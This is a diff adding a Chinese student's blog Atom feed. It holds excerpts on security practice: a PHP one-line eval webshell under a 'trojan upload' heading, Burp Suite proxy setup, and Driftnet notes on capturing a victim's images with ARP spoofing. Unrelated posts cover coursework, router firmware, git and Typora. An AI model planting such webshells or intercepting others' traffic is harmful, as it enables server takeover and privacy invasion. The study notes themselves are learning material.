@@ -1,0 +1,246 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://tjx158589.github.io</id>
+    <title>toby的博客</title>
+    <updated>2021-01-26T03:57:55.371Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://tjx158589.github.io"/>
+    <link rel="self" href="https://tjx158589.github.io/atom.xml"/>
+    <subtitle>大一学生自己的博客</subtitle>
+    <logo>https://tjx158589.github.io/images/avatar.png</logo>
+    <icon>https://tjx158589.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2021, toby的博客</rights>
+    <entry>
+        <title type="html"><![CDATA[一句话木马Webshell]]></title>
+        <id>https://tjx158589.github.io/post/74DdnBfLO/</id>
+        <link href="https://tjx158589.github.io/post/74DdnBfLO/">
+        </link>
+        <updated>2021-01-26T03:52:53.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="一句话木马webshell">一句话木马Webshell</h1>
+<pre><code>&lt;?php @eval($_GET[command]);?&gt;
+
+&lt;?php @eval($_POST[command]);?&gt;
+
+</code></pre>
+<h4 id="木马上传">木马上传</h4>
+<blockquote>
+<p>制作木马php</p>
+</blockquote>
+<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggksuhtvthj30vo0kaam7.jpg" alt="image-20200709162716117" style="zoom:50%;" />]]></summary>
+        <content type="html"><![CDATA[<h1 id="一句话木马webshell">一句话木马Webshell</h1>
+<pre><code>&lt;?php @eval($_GET[command]);?&gt;
+
+&lt;?php @eval($_POST[command]);?&gt;
+
+</code></pre>
+<h4 id="木马上传">木马上传</h4>
+<blockquote>
+<p>制作木马php</p>
+</blockquote>
+<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggksuhtvthj30vo0kaam7.jpg" alt="image-20200709162716117" style="zoom:50%;" />]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[burpsuite 抓包练习]]></title>
+        <id>https://tjx158589.github.io/post/4tkAOajCp/</id>
+        <link href="https://tjx158589.github.io/post/4tkAOajCp/">
+        </link>
+        <updated>2021-01-26T03:51:51.000Z</updated>
+        <summary type="html"><![CDATA[<h3 id="1-火狐代理安装">1、火狐代理安装</h3>
+<blockquote>
+<p>firefox - 右上角菜单 - Add-ons - 搜索Proxy SwitchyOmega - 安装</p>
+<figure data-type="image" tabindex="1"><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggkm3nd4xjj30vm0g2myc.jpg" alt="image-20200709123227751" loading="lazy"></figure>
+</blockquote>
+]]></summary>
+        <content type="html"><![CDATA[<h3 id="1-火狐代理安装">1、火狐代理安装</h3>
+<blockquote>
+<p>firefox - 右上角菜单 - Add-ons - 搜索Proxy SwitchyOmega - 安装</p>
+<figure data-type="image" tabindex="1"><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggkm3nd4xjj30vm0g2myc.jpg" alt="image-20200709123227751" loading="lazy"></figure>
+</blockquote>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Driftnet学习笔记]]></title>
+        <id>https://tjx158589.github.io/post/dg16Ph5CE/</id>
+        <link href="https://tjx158589.github.io/post/dg16Ph5CE/">
+        </link>
+        <updated>2021-01-26T03:50:06.000Z</updated>
+        <summary type="html"><![CDATA[<h1 id="driftnet学习笔记">Driftnet学习笔记</h1>
+<h2 id="一-工具介绍">一、工具介绍</h2>
+<ul>
+<li>
+<p>driftnet是一款简单而使用的图片捕获工具，可以很方便的在网络数据包中抓取图片。</p>
+</li>
+<li>
+<p>这次用到这个工具的原因是与 ettercap 相配合，抓去被害人浏览的图片。</p>
+</li>
+<li>
+<p>此篇应与 ettercap ARP欺骗相互配合观看。</p>
+</li>
+</ul>
+<h4 id="命令介绍">命令介绍</h4>
+<h4 id="命令原型">命令原型</h4>
+<pre><code class="language-cmd">driftnet  [options]  [filter code] 
+</code></pre>
+]]></summary>
+        <content type="html"><![CDATA[<h1 id="driftnet学习笔记">Driftnet学习笔记</h1>
+<h2 id="一-工具介绍">一、工具介绍</h2>
+<ul>
+<li>
+<p>driftnet是一款简单而使用的图片捕获工具，可以很方便的在网络数据包中抓取图片。</p>
+</li>
+<li>
+<p>这次用到这个工具的原因是与 ettercap 相配合，抓去被害人浏览的图片。</p>
+</li>
+<li>
+<p>此篇应与 ettercap ARP欺骗相互配合观看。</p>
+</li>
+</ul>
+<h4 id="命令介绍">命令介绍</h4>
+<h4 id="命令原型">命令原型</h4>
+<pre><code class="language-cmd">driftnet  [options]  [filter code] 
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[计算机导论期末复习资料]]></title>
+        <id>https://tjx158589.github.io/post/elbtsnl8g/</id>
+        <link href="https://tjx158589.github.io/post/elbtsnl8g/">
+        </link>
+        <updated>2021-01-26T03:43:42.000Z</updated>
+        <summary type="html"><![CDATA[<h2 id="第一章">第一章</h2>
+<h4 id="讲述计算机的发展历程">讲述计算机的发展历程</h4>
+<ol>
+<li>
+<p>机械计算器（1930以前）</p>
+</li>
+<li>
+<p>电子计算机的诞生（1930-1950）</p>
+<ol>
+<li>早起电子计算机</li>
+<li>基于冯洛伊曼模型的计算机</li>
+</ol>
+</li>
+<li>
+<p>计算机的诞生（1950—今）</p>
+</li>
+</ol>
+<h4 id="计算机有哪些特点">计算机有哪些特点</h4>
+]]></summary>
+        <content type="html"><![CDATA[<h2 id="第一章">第一章</h2>
+<h4 id="讲述计算机的发展历程">讲述计算机的发展历程</h4>
+<ol>
+<li>
+<p>机械计算器（1930以前）</p>
+</li>
+<li>
+<p>电子计算机的诞生（1930-1950）</p>
+<ol>
+<li>早起电子计算机</li>
+<li>基于冯洛伊曼模型的计算机</li>
+</ol>
+</li>
+<li>
+<p>计算机的诞生（1950—今）</p>
+</li>
+</ol>
+<h4 id="计算机有哪些特点">计算机有哪些特点</h4>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[arp欺骗+Driftnet 局域网截取照片]]></title>
+        <id>https://tjx158589.github.io/post/cD7xvp1nC/</id>
+        <link href="https://tjx158589.github.io/post/cD7xvp1nC/">
+        </link>
+        <updated>2020-05-23T14:19:25.000Z</updated>
+        <summary type="html"><![CDATA[<p>、### 其实这个也是非常简单，只有三句命令就可以实现。没啥技术难度，不过只能在局域网内实现。</p>
+<h5 id="1-更改转发模式">1、更改转发模式</h5>
+<pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+</code></pre>
+<img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf2q4h2n18j30vv0u07wh.jpg" alt="image-20200523215235878" style="zoom:67%;" />]]></summary>
+        <content type="html"><![CDATA[<p>、### 其实这个也是非常简单，只有三句命令就可以实现。没啥技术难度，不过只能在局域网内实现。</p>
+<h5 id="1-更改转发模式">1、更改转发模式</h5>
+<pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+</code></pre>
+<img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf2q4h2n18j30vv0u07wh.jpg" alt="image-20200523215235878" style="zoom:67%;" />]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[小米路由器min刷breed+padavan固件]]></title>
+        <id>https://tjx158589.github.io/post/ge4jbtkcR/</id>
+        <link href="https://tjx158589.github.io/post/ge4jbtkcR/">
+        </link>
+        <updated>2020-05-16T14:45:50.000Z</updated>
+        <summary type="html"><![CDATA[<h2 id="11-下载软件包">1.1 下载软件包</h2>
+<p><a href="https://ww.lanzous.com/icnbsih">点我下载  链接：https://ww.lanzous.com/icnbsih</a></p>
+<blockquote>
+<p>下载后首先进行解压缩，解压缩请使用鼠标右键解压到某路径，别直接双击打开压缩包。</p>
+<img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geuohzxg2bj30lg0o8499.jpg" alt="image-20200516225150019" style="zoom: 50%;" />
+</blockquote>
+]]></summary>
+        <content type="html"><![CDATA[<h2 id="11-下载软件包">1.1 下载软件包</h2>
+<p><a href="https://ww.lanzous.com/icnbsih">点我下载  链接：https://ww.lanzous.com/icnbsih</a></p>
+<blockquote>
+<p>下载后首先进行解压缩，解压缩请使用鼠标右键解压到某路径，别直接双击打开压缩包。</p>
+<img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geuohzxg2bj30lg0o8499.jpg" alt="image-20200516225150019" style="zoom: 50%;" />
+</blockquote>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[一张图学会使用git]]></title>
+        <id>https://tjx158589.github.io/post/dO60L6gOU/</id>
+        <link href="https://tjx158589.github.io/post/dO60L6gOU/">
+        </link>
+        <updated>2020-05-01T06:49:23.000Z</updated>
+        <summary type="html"><![CDATA[<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ge9arpd4buj317c0u0kfe.jpg" alt="gitcheatsheet" style="zoom:50%;" />]]></summary>
+        <content type="html"><![CDATA[<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ge9arpd4buj317c0u0kfe.jpg" alt="gitcheatsheet" style="zoom:50%;" />]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[typora 使用方法]]></title>
+        <id>https://tjx158589.github.io/post/DxtlyjtyA/</id>
+        <link href="https://tjx158589.github.io/post/DxtlyjtyA/">
+        </link>
+        <updated>2020-04-27T16:21:07.000Z</updated>
+        <summary type="html"><![CDATA[<h2 id="1标题">1.标题</h2>
+<pre><code>#       一级标题    
+##      二级标题    
+###     三级标题    
+####    四级标题    
+#####   五级标题    
+######  六级标题    
+</code></pre>
+<h2 id="2引用">2.引用</h2>
+]]></summary>
+        <content type="html"><![CDATA[<h2 id="1标题">1.标题</h2>
+<pre><code>#       一级标题    
+##      二级标题    
+###     三级标题    
+####    四级标题    
+#####   五级标题    
+######  六级标题    
+</code></pre>
+<h2 id="2引用">2.引用</h2>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[hugo+github博客搭建]]></title>
+        <id>https://tjx158589.github.io/post/hugogithua-bo-ke-da-jian-md/</id>
+        <link href="https://tjx158589.github.io/post/hugogithua-bo-ke-da-jian-md/">
+        </link>
+        <updated>2020-04-27T15:41:19.000Z</updated>
+        <summary type="html"><![CDATA[<h2 id="准备">准备</h2>
+<h3 id="安装brew">安装brew</h3>
+<blockquote>
+<p>打开终端，执行下面的命令。</p>
+</blockquote>
+<pre><code>$ /usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;
+</code></pre>
+]]></summary>
+        <content type="html"><![CDATA[<h2 id="准备">准备</h2>
+<h3 id="安装brew">安装brew</h3>
+<blockquote>
+<p>打开终端，执行下面的命令。</p>
+</blockquote>
+<pre><code>$ /usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;
+</code></pre>
+]]></content>
+    </entry>
+</feed>
